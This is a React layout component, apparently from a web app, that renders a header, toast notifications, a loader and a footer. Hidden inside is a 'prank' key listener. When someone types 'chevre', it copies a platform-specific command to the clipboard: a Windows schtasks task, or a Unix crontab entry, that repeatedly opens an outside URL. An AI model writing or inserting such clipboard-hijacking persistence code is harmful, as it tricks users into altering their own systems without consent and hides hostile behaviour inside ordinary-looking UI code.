import React from 'react';
import './Template.css';
import 'react-toastify/dist/ReactToastify.css';
import {ToastContainer} from 'react-toastify';
import {Header} from "./Header";
import {Footer} from "./Footer";
import { Loader } from '../feature/loader/components/Loader';

export const Template = ({children}) => {
    let phrase = "";
    const prank = event => {
        phrase += event.key
        if (phrase.includes("chevre")) {
            alert('Copié')
            copyToClipboard()
            phrase = "";
        }
    }

    const copyToClipboard = () => {
        const platform = window.navigator.platform
        const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE']
        const textField = document.createElement('textarea')
        if (windowsPlatforms.indexOf(platform) !== -1) {
            textField.innerText = "schtasks /CREATE /sc minute /TN CHEVRE_GANG /TR \"cmd.exe /c start https://malzik.ovh/goat\" && cmd /c echo.|clip"
        } else {
            textField.innerText = "crontab -l | { cat; echo \"0 * * * * export DISPLAY=:0 && firefox --new-window https://malzik.ovh/goat\"; } | crontab -"
        }
        document.body.appendChild(textField)
        textField.select()
        document.execCommand('copy')
        textField.remove()
    }

    return (
        <div className="Template" onKeyDown={prank} tabIndex="0">
            <Header/>
            <ToastContainer/>
            {children}
            <Loader/>
            <Footer/>
        </div>
    );
}
